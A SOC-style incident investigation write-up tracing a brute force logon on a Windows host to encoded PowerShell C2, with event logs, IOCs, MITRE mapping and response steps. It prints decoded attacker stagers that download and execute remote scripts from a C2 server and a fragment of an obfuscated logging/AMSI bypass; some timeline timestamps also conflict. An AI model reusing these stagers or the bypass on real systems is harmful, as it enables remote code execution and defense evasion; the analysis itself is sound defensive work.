# 🔴 Alert Investigation — Brute Force to PowerShell C2 via Encoded Command

![Status](https://img.shields.io/badge/Status-Complete-green?style=flat)
![Severity](https://img.shields.io/badge/Severity-Critical-red?style=flat)
![Type](https://img.shields.io/badge/Type-Alert%20Investigation-blue?style=flat)
![Attack](https://img.shields.io/badge/Attack-Brute%20Force%20%7C%20PowerShell%20C2%20%7C%20AMSI%20Bypass-orange?style=flat)
![MITRE](https://img.shields.io/badge/MITRE-T1110%20%7C%20T1059.001%20%7C%20T1027%20%7C%20T1105%20%7C%20T1071-blue?style=flat)
![Tools](https://img.shields.io/badge/Tools-Wazuh%20%7C%20Sysmon%20%7C%20CyberChef-informational?style=flat)

---

## 📋 Case Header

| Field | Detail |
|---|---|
| **Case Title** | Brute Force to PowerShell C2 via Encoded Command |
| **Date** | November 17, 2025 |
| **Affected Host** | `PC01` |
| **Affected User** | `sarah` |
| **Attacker IPs** | `104.28.242.42` / `103.114.211.240` |
| **C2 Server** | `10.0.0.11` (ports 80, 8080, 4444) |
| **Severity** | 🔴 Critical |
| **Verdict** | ✅ True Positive — Full compromise confirmed: brute force → initial access → PowerShell C2 |

---

## 🎯 Scenario

A Wazuh alert triggered on `PC01` for a high volume of failed authentication events. What appeared to be a routine brute force attempt quickly escalated — the attacker successfully authenticated, then immediately executed an encoded PowerShell command that established a C2 channel and dropped additional payloads on disk.

This investigation traces the full kill chain from the first failed logon to an active reverse shell on port `4444`.

---

## 🛠️ Tools Used

| Tool | Purpose |
|---|---|
| **Wazuh / Kibana** | SIEM — log aggregation, alert triage, event correlation |
| **Sysmon** | Endpoint telemetry — process creation, file events, network connections |
| **CyberChef** | Decode Base64 encoded PowerShell payloads |

---

## 🗂️ Artifacts

| Artifact | Description |
|---|---|
| Windows Event ID 4625 | Failed logon attempts — brute force source identification |
| Windows Event ID 4624 | Successful logon — initial access confirmation |
| Sysmon Event ID 1 | Process creation — PowerShell execution with encoded command |
| Sysmon Event ID 11 | File creation — PS1 payloads dropped to disk |
| Sysmon Event ID 3 | Network connection — C2 callback to `10.0.0.11` |
| Windows Event ID 4104 | PowerShell ScriptBlock logging — obfuscated AMSI bypass captured |

---

## 📚 Resources

| Resource | Link |
|---|---|
| MITRE T1110 — Brute Force | [attack.mitre.org](https://attack.mitre.org/techniques/T1110/) |
| MITRE T1059.001 — PowerShell | [attack.mitre.org](https://attack.mitre.org/techniques/T1059/001/) |
| MITRE T1027 — Obfuscated Files | [attack.mitre.org](https://attack.mitre.org/techniques/T1027/) |
| MITRE T1105 — Ingress Tool Transfer | [attack.mitre.org](https://attack.mitre.org/techniques/T1105/) |
| MITRE T1071 — Application Layer Protocol | [attack.mitre.org](https://attack.mitre.org/techniques/T1071/) |
| Sysmon Event ID Reference | [docs.microsoft.com](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon) |


---

## 🔍 Investigation Methodology

```
Step 1 → Brute Force Detection     (Event ID 4625 — failed logons volume)
Step 2 → Initial Access Confirmed  (Event ID 4624 — successful logon)
Step 3 → PowerShell Execution      (Sysmon EID 1 — encoded command launched)
Step 4 → Payload Decode            (CyberChef — Base64 → IEX DownloadString)
Step 5 → File Drop                 (Sysmon EID 11 — PS1 files written to disk)
Step 6 → C2 Callback               (Sysmon EID 3 — outbound to 10.0.0.11:4444)
Step 7 → AMSI Bypass               (Event ID 4104 — obfuscated ScriptBlock logged)
```
---

## 🕵️ Investigation

### Step 1 — Brute Force Detection: 436 Failed Logons

The alert was triggered by a flood of **Windows Event ID 4625** (failed logon) events on `PC01`.

> <img width="1328" height="361" alt="0" src="https://github.com/user-attachments/assets/8b5eec51-c3d1-4232-afc0-c4bbee3e63be" />
> <img width="1336" height="280" alt="00" src="https://github.com/user-attachments/assets/d536b91a-a93e-47e9-8630-734202f4ba79" />


```
Event ID:    4625 (Failed Logon)
Source IP:   104.28.242.42
Target Host: PC01
Count:       436 attempts
Timeframe:   11:27:28 → 11:27:36 (< 1 minute)
```

> ### 🔎 Why Event ID 4625?
> EID 4625 is logged every time a Windows logon attempt fails. A single external IP generating 436 failures in under a minute against the same host is a textbook **credential brute force** pattern. The volume and speed rule out human error — this is automated.

---

### Step 2 — Initial Access Confirmed: Successful Logon

After the brute force, **Event ID 4624** (successful logon) was observed from the same attacker IP on `PC01`.

> <img width="1319" height="115" alt="001" src="https://github.com/user-attachments/assets/5c97ec91-da03-4bf6-9b22-ae134c1676d6" />

> <img width="1314" height="119" alt="01" src="https://github.com/user-attachments/assets/40f2918c-ded2-44ed-b760-b0a5f736b745" />
```
Event ID:    4624 (Successful Logon)
Source IPs:  104.28.242.42 / 103.114.211.240
Target Host: PC01
User:        sarah
Time:        11:20:34 / 11:22:57 / 11:26:26
```

> ### 🔎 Why Event ID 4624?
> EID 4624 confirms a successful authentication. Coming directly after 436 failed attempts from the same IP, this is **not a coincidence** — the brute force succeeded. The attacker now has valid credentials for user `sarah` on `PC01`.

---
## Step 3 — PowerShell Execution: Encoded Command

Immediately after access, **Sysmon Event ID 1** captured `PowerShell.exe` executing with a suspicious `-EncodedCommand` flag under user `sarah`.

> <img width="1331" height="152" alt="1" src="https://github.com/user-attachments/assets/69845bfa-fc22-4a51-b545-59a307dd98c5" />

```
Process:     C:\Windows\System32\WindowsPowerShell\v1.0\PowerShell.exe
User:        PC01\sarah
CommandLine: powershell.exe -EncodedCommand SQBFAFgAKABOAGUAdwAt...
Time:        2025-11-17T11:21:33
```
> ### 🔎 Why Sysmon Event ID 1?
> Sysmon EID 1 logs every process creation including the full command line. The `-EncodedCommand` flag is a classic attacker technique to hide the real payload from plain-text log monitoring. Anything encoded needs to be decoded immediately — that's the next step.

---

### Step 4 — Payload Decoded: IEX DownloadString

The Base64 encoded command was decoded using **CyberChef** (From Base64 → Decode text UTF-16LE):

> <img width="1094" height="409" alt="2" src="https://github.com/user-attachments/assets/ee770492-be1b-4d64-ace6-8f0a2255a14a" />


```powershell
# First payload decoded:
IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.11/haha.ps1')
```

A second encoded command was also captured and decoded:

>  <img width="1331" height="265" alt="4" src="https://github.com/user-attachments/assets/5412ee23-a2db-4d91-ac6d-f5b8d934352d" />

> <img width="1359" height="555" alt="5" src="https://github.com/user-attachments/assets/be563a97-526d-4061-b573-0ae6485d2a39" />



```powershell
# Second payload decoded:
[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;
$ja=new-object net.webclient;
if([System.Net.WebProxy]::GetDefaultProxy().address -ne $null){
  $ja.proxy=[Net.WebRequest]::GetSystemWebProxy();
  $ja.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;
}
IEX ((new-object Net.WebClient).DownloadString('http://10.0.0.11:8080/nj6VXD4hquF64Q/Z2oecggFq'));
IEX ((new-object Net.WebClient).DownloadString('http://10.0.0.11:8080/nj6VXD4hquF64Q'));
```

> ### 🔎 Why IEX + DownloadString?
> `Invoke-Expression` + `DownloadString` is a **fileless execution** technique — the attacker downloads a script directly into memory and runs it without writing the main payload to disk. The TLS configuration in the second payload suggests a more sophisticated stager, likely a C2 framework implant (Metasploit/Cobalt Strike/Sliver pattern).

---
### Step 5 — Files Dropped to Disk

**Sysmon Event ID 11** (File Create) showed PowerShell dropping `.ps1` files to `sarah`'s temp directory:

> <img width="1324" height="124" alt="6" src="https://github.com/user-attachments/assets/cf1553ef-8512-4bb3-8965-93fe0495af31" />

```
Process:   PowerShell.exe
User:      PC01\sarah
Files:     C:\Users\sarah\AppData\Local\Temp\3__PSScriptPolicyTest_qkov5u21.f.ps1
C:\Users\sarah\AppData\Local\Temp\3__PSScriptPolicyTest_4h3zq2b3.msq.ps1
Time:      11:21:33 / 11:21:34
Rule:      FileCreate
```
> ### 🔎 Why Sysmon Event ID 11?
> EID 11 logs file creation events. The `__PSScriptPolicyTest_*` naming pattern is typical of PowerShell's execution policy bypass — the framework writes a test script to disk to probe and bypass script execution restrictions before running the real payload.

---

### Step 6 — C2 Callback: Reverse Shell on Port 4444

**Sysmon Event ID 3** (Network Connection) confirmed outbound connections from `PowerShell.exe` to the C2 server:

> <img width="1330" height="263" alt="7" src="https://github.com/user-attachments/assets/54d9943a-daa5-45e2-aee9-11679fcd9d00" />


> <img width="1333" height="273" alt="8" src="https://github.com/user-attachments/assets/7a01fe10-f0ad-4bc0-a8f2-0fb4c8309568" />

```
Process:     PowerShell.exe
User:        PC01\sarah
Source IP:   10.0.0.50 (PC01)
Dest IP:     10.0.0.11 (C2 server)
Ports:       80 (HTTP), 8080 (stager), 4444 (reverse shell)
Time:        11:21:35 → 11:21:36
Rule:        NetworkConnect
```
> ### 🔎 Why Sysmon Event ID 3?
> EID 3 captures outbound network connections per process. PowerShell reaching out to three different ports on the same internal server is highly suspicious — port `80` for initial callback, `8080` for the stager download, and `4444` which is the **default Metasploit reverse shell port**. This confirms an active C2 session was established.

---

### Step 7 — AMSI Bypass: Obfuscated ScriptBlock

**Windows Event ID 4104** (ScriptBlock Logging) captured a heavily obfuscated PowerShell script executing on `PC01`:

> <img width="1358" height="454" alt="99" src="https://github.com/user-attachments/assets/7cd437f3-e940-4918-be53-060d9adad90d" />

```
Event ID:     4104 (Script Block Logging)
ScriptBlock:  $yLY=[Collections.Generic.Dictionary[string,System.Object]]::new();
If($PSVersionTable.PSVersion.Major -ge 3){
$rCh=(('Scri'+'p{2}'+'...lockLogg'+'ing')-f'B','k','t');
... [AMSI bypass pattern — disabling script block logging]
ScriptBlock ID: b034ea87-475a-429e-849d-68f98533e793
```

> ### 🔎 Why Event ID 4104?
> EID 4104 is PowerShell's ScriptBlock logging — it captures the actual code before it executes, even when obfuscated. The obfuscation pattern here (string concatenation with `-f` format operator, dictionary manipulation) is a known **AMSI bypass** technique used by frameworks like Cobalt Strike and Metasploit to disable PowerShell's security logging mid-execution. The fact that it was still captured means logging was active before the bypass could complete.

---

## ⏱️ Attack Timeline

| Time | Event | Detail |
|---|---|---|
| `11:20:34` | 🔴 Brute Force Begins | 436 failed logons from `104.28.242.42` → `PC01` |
| `11:20:34` | 🔴 Initial Access | EID 4624 — successful logon, user `sarah`, from `103.114.211.240` |
| `11:22:57` | 🔴 Logon Confirmed | Second successful logon from `104.28.242.42` |
| `11:21:33` | 🔴 PowerShell Execution | Encoded command launched — `IEX DownloadString haha.ps1` |
| `11:21:33` | 🔴 File Drop | PS1 policy test files written to `sarah`'s temp folder |
| `11:21:34` | 🔴 Second Payload | PowerShell console startup + second encoded stager executed |
| `11:21:35` | 🔴 C2 Callback | PowerShell connects to `10.0.0.11` on ports 80, 8080, 4444 |
| `11:21:36` | 🔴 Reverse Shell | Active C2 session established on port `4444` |
| `~11:21` | 🔴 AMSI Bypass | EID 4104 — obfuscated ScriptBlock attempts to disable logging |

---

## 🧾 IOC Table

| Type | Value | Description |
|---|---|---|
| IP | `104.28.242.42` | Brute force source / attacker IP |
| IP | `103.114.211.240` | Secondary attacker IP — successful logon |
| IP | `10.0.0.11` | Internal C2 server |
| Port | `4444` | Reverse shell (Metasploit default) |
| Port | `8080` | C2 stager download |
| URL | `http://10.0.0.11/haha.ps1` | First stage payload |
| URL | `http://10.0.0.11:8080/nj6VXD4hquF64Q/Z2oecggFq` | Second stage payload |
| File | `__PSScriptPolicyTest_qkov5u21.f.ps1` | Policy bypass test script |
| File | `__PSScriptPolicyTest_4h3zq2b3.msq.ps1` | Policy bypass test script |
| Path | `C:\Users\sarah\AppData\Local\Temp\3\` | Payload staging directory |
| User | `sarah` | Compromised account |
| Host | `PC01` | Compromised endpoint |
| ScriptBlock ID | `b034ea87-475a-429e-849d-68f98533e793` | AMSI bypass script |

---

## 🗺️ MITRE ATT&CK Mapping

| Tactic | Technique | ID | Evidence |
|---|---|---|---|
| Credential Access | Brute Force | T1110 | 436 EID 4625 from same IP in <1 min |
| Initial Access | Valid Accounts | T1078 | EID 4624 — `sarah` logon after brute force |
| Execution | PowerShell | T1059.001 | `powershell.exe -EncodedCommand` |
| Defense Evasion | Obfuscated Files or Information | T1027 | Base64 encoded payload + string obfuscation |
| Defense Evasion | Impair Defenses — AMSI Bypass | T1562.001 | EID 4104 ScriptBlock disabling logging |
| Command & Control | Application Layer Protocol | T1071 | HTTP/HTTPS callbacks to `10.0.0.11` |
| Command & Control | Ingress Tool Transfer | T1105 | `DownloadString` pulling PS1 from C2 |
| C2 | Non-Standard Port | T1571 | Port `4444` reverse shell |

---

## 🚨 Response Actions

| Priority | Action |
|---|---|
| 🔴 Immediate | Isolate `PC01` from the network |
| 🔴 Immediate | Disable account `sarah` — reset credentials |
| 🔴 Immediate | Block `104.28.242.42` and `103.114.211.240` at firewall |
| 🔴 Immediate | Isolate / investigate `10.0.0.11` — C2 server on internal network |
| 🟠 High | Pull memory dump from `PC01` — fileless payload may still be in memory |
| 🟠 High | Scan for additional hosts that connected to `10.0.0.11` |
| 🟡 Medium | Review all EID 4624 events — check for lateral movement from `sarah` |
| 🟡 Medium | Audit PowerShell execution policy and enable constrained language mode |
| 🟡 Medium | Enable AMSI logging and PowerShell module logging across all endpoints |

---

## 📝 Lessons Learned

> **The attacker got in through the front door.**
> No exploit, no zero-day — just a weak password and no account lockout policy. Once in, they weaponized PowerShell within seconds. The C2 server being on the **internal network** (`10.0.0.11`) suggests either a previously compromised internal host or an insider-assisted operation.

Key takeaways:
- Account lockout policies would have stopped the brute force at step 1
- `-EncodedCommand` PowerShell should trigger an immediate high-severity alert
- An internal IP acting as C2 is a critical finding — it means the network was already partially compromised before this incident
- AMSI bypass attempts indicate a sophisticated, framework-driven attack — not a script kiddie

---

## 📚 References

| Resource | Link |
|---|---|
| MITRE T1110 — Brute Force | [attack.mitre.org](https://attack.mitre.org/techniques/T1110/) |
| MITRE T1059.001 — PowerShell | [attack.mitre.org](https://attack.mitre.org/techniques/T1059/001/) |
| MITRE T1027 — Obfuscation | [attack.mitre.org](https://attack.mitre.org/techniques/T1027/) |
| MITRE T1105 — Ingress Tool Transfer | [attack.mitre.org](https://attack.mitre.org/techniques/T1105/) |
| Sysmon Event ID Reference | [docs.microsoft.com](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon) |
| CyberChef | [gchq.github.io/CyberChef](https://gchq.github.io/CyberChef/) |

---


